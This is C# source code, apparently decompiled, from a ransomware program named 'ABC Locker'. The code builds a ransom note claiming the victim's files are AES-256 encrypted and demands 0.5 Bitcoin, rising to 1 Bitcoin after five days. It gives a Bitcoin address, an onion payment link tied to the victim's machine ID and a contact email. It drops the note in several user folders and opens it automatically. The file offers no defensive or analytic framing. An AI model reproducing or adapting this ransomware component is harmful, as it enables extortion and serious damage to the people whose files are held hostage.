using System.Diagnostics;
using System.IO;
using System.Text;

namespace abc;

internal class Messenger
{
	public static string messageFile = "OPEN_TO_UNLOCK_YOUR_FILES.html";

	public static void createMessage(string filePath)
	{
		string value = "<html> <head> <style> body{ \tbackground-color: rgb(242,242,242); } .mainwrapper{ \twidth: 650px; \tmargin-left: auto; \tmargin-right: auto; \tmargin-bottom: 20px; \tfont-family: arial; \tfont-size: 16px; \tborder: 2px solid; \tborder-color: red; } .mainwrapper .headerbar{ \tbackground-color: red; \tcolor: white; \tfont-weight:bold; \tfont-size: 30px; \tmargin:0px; \tpadding: 6px; \tmargin-bottom: 10px; } .innercontent{ \tpadding: 10px; } </style> </head> <body> <div class=\"mainwrapper\"> <p class=\"headerbar\" align=\"center\">All your files have been encrypted by ABC Locker</p> <div class=\"innercontent\"> <div> All your files have been encrypted with an unique password using AES-256 CBC encryption.<br><br>  <center><span class=\"green\"><b>You are able to unlock your files by paying 0.5 Bitcoins (~&euro;249 / &dollar;275)</b></span><br><br><span class=\"red\"><b>If payment is not made with 5 days the cost of decrypting your files will rise to 1 Bitcoins (~&euro;500 / &dollar;550)!</b></span></center><hr>  The only way to get your files back is by purchasing the decryption password!<br> The decryption password will cost 0.5 Bitcoins = &dollar;/&euro;249.<br> You have 5 days before the price increases to &dollar;/&euro;500!<br> <br> Antivirus software will NOT be able to recover your files! The only way to recover your files is by purchasing the decryption password.<br> <br> </div>  <br> On this page you will be able to purchase the bitcoins needed to receive the unique decryption password and decryption software to unlock your files.<br> After you have paid the requested amount in bitcoins refresh this webpage.<br> At the bottom of the page and your unique decryption password will appear alongside a download link for the decryption software.  <br><p class=\"titlebar\" align=\"center\">How to buy Bitcoins:</p> <p class=\"titlebar\">1. Register a bitcoin wallet (optional)</p>You can either register your own bitcoin wallet or have the bitcoin seller send the bitcoins directly to your address <a target=\"_BLANK\" href=\"http://blockchain.info\">(click here for more information)</a><p class=\"titlebar\">2. Purchasing Bitcoins</p>You need to purchase 0.5 Bitcoins<br><br>Below are a couple websites that allow you to purchase bitcoins<br><ul><li><a target=\"_BLANK\" href=\"https://bitonic.nl\">https://bitonic.nl</a> - Purchase Bitcoin with iDeal and MisterCash</li><li><a target=\"_BLANK\" href=\"https://www.coinbase.com\">https://www.coinbase.com</a> - Purchase bitcoins with your bank account or credit card</li><li><a target=\"_BLANK\" href=\"https://www.litebit.eu\">https://www.litebit.eu</a> - Purchase bitcoins with Sofort Banking / Giropay / iDeal</li><li><a target=\"_BLANK\" href=\"https://www.coinjar.com\">https://www.coinjar.com</a> - Purchase Bitcoins with CreditCard / Bank Transfer</li><li><a target=\"_BLANK\" href=\"https://btcdirect.eu\">https://btcdirect.eu</a> - Purchase Bitcoins with iDeal / Bancontact / Bank transfer</li><li><a target=\"_BLANK\" href=\"http://localbitcoins.com\">http://localbitcoins.com</a> - Purchase bitcoins with a variety of payment methods such as bank transfer, western union, cash, paypal and credit card</li><li><a target=\"_BLANK\" href=\"https://www.bitstamp.net\">https://www.bitstamp.net</a> - Purchase Bitcoins through bank transfer </li><li><a target=\"_BLANK\" href=\"https://anycoindirect.eu\">https://anycoindirect.eu</a> - Purchase Bitcoins with Giropay / Trustpay / iDeal / SEPA / Bancontact / Mistercash</li></ul>  <p class=\"titlebar\">3. Send <input type=\"text\" size=\"4\" value=\"0.5\"> Bitcoins to " + Network.getAddress() + "</p> <p class=\"titlebar\">4. Confirm your payment</p>Once you have paid the required amount of bitcoins refresh this webpage<br> Please note that it can take up to 20 minutes for the payment to be confirmed.<br><br> <p class=\"titlebar\">5. Go to <a href =\"http://dw2dzfkwejxaskxr.onion.to/abc/" + Form1.getMachineID() + "\">http://dw2dzfkwejxaskxr.onion.to/abc/" + Form1.getMachineID() + "</a> after making full payment and get the tool to decrypt your files and open them again. For help with payment, email abchelper@sigaint.org</p></div></div></body></html>";
		using FileStream stream = new FileStream(filePath, FileMode.Create);
		using StreamWriter streamWriter = new StreamWriter(stream, Encoding.UTF8);
		streamWriter.WriteLine(value);
	}

	public static void sendMessage()
	{
		createMessage(Form1.userDir + "Desktop\\" + messageFile);
		createMessage(Form1.userDir + "Documents\\" + messageFile);
		createMessage(Form1.userDir + "Music\\" + messageFile);
		createMessage(Form1.userDir + "Pictures\\" + messageFile);
		createMessage(Form1.userDir + "Videos\\" + messageFile);
		Process.Start(Form1.userDir + "Desktop\\" + messageFile);
	}
}
